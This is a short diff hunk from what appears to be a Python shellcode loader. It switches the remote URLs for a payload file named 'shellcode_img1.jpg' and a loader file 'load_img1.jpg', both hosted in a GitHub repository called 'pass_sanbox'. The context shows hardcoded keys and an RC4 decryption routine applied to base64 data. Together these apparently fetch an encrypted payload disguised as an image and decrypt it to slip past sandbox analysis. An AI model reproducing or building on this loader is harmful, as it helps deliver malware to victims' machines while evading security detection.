@@ -13,8 +13,8 @@ if __name__=="__main__":
 
 key='123456'
 key2='123456'
-PayloadFileLocation='https://raw.githubusercontent.com/king-notfound404/workfile/main/shellcode_img1.jpg'
-LoaderFileLocation='https://raw.githubusercontent.com/king-notfound404/workfile/main/load_img1.jpg'
+PayloadFileLocation='https://github.com/king-notfound404/pass_sanbox/blob/main/shellcode_img1.jpg'
+LoaderFileLocation='https://github.com/king-notfound404/pass_sanbox/blob/main/load_img1.jpg'
 def rc4(text,key):
     key=hashlib.md5(key).hexdigest()
     text=base64.b64decode(text)
